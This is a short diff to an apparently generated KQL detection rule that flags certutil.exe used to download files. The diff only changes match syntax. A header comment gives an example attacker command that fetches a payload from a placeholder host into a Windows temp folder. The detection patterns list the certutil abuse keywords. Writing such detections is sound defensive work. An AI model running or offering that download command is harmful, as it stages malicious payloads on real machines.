@@ -5,4 +5,4 @@
 //   certutil.exe -urlcache -split -f http://<host>/payload.txt C:\Windows\Temp\p.txt
 // source: rules/execution/certutil-download.yml  (GENERATED, do not edit by hand)
 Event
-| where (((NewProcessName endswith "\\certutil.exe")) and ((CommandLine has_any (dynamic(["urlcache", "verifyctl", "decode", "-f http"])))))
+| where (((NewProcessName endswith @"\certutil.exe")) and ((CommandLine contains @"urlcache" or CommandLine contains @"verifyctl" or CommandLine contains @"decode" or CommandLine contains @"-f http")))
